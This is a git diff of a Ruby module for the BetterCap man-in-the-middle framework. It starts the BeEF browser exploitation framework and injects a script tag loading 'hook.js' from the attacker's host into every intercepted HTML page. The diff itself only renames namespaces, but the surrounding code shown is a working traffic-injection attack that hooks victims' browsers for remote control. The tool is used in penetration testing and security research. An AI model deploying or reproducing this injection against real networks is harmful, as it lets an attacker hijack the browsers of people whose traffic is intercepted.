@@ -12,19 +12,19 @@ This project is released under the GPL 3 license.
 
 # Handle BeEF framework execution and injection into
 # html pages automagically.
-class BeefBox < Proxy::Module
+class BeefBox < BetterCap::Proxy::Module
   def initialize
     @beefport = 3000
     @beefpid  = nil
-    @hookname = 'hook.js'    
-    @jsfile   = "http://#{Context.get.ifconfig[:ip_saddr]}:#{@beefport}/#{@hookname}"
+    @hookname = 'hook.js'
+    @jsfile   = "http://#{BetterCap::Context.get.ifconfig[:ip_saddr]}:#{@beefport}/#{@hookname}"
 
     while !beef_path_valid?
       print '[BEEFBOX] Please specify the BeEF installation path: '.yellow
       @beefpath = gets.chomp
     end
 
-    Logger.warn "[BEEFBOX] Starting BeEF ..."
+    BetterCap::Logger.warn "[BEEFBOX] Starting BeEF ..."
 
     @beefpid = fork do
       exec "cd '#{@beefpath}' && ./beef"
@@ -34,7 +34,7 @@ class BeefBox < Proxy::Module
   def on_request( request, response )
     # is it a html page?
     if response.content_type =~ /^text\/html.*/
-      Logger.warn "Injecting BeEF into http://#{request.host}#{request.url}"
+      BetterCap::Logger.warn "Injecting BeEF into http://#{request.host}#{request.url}"
 
       response.body.sub!( '</title>', "</title><script src='#{@jsfile}' type='text/javascript'></script>" )
     end
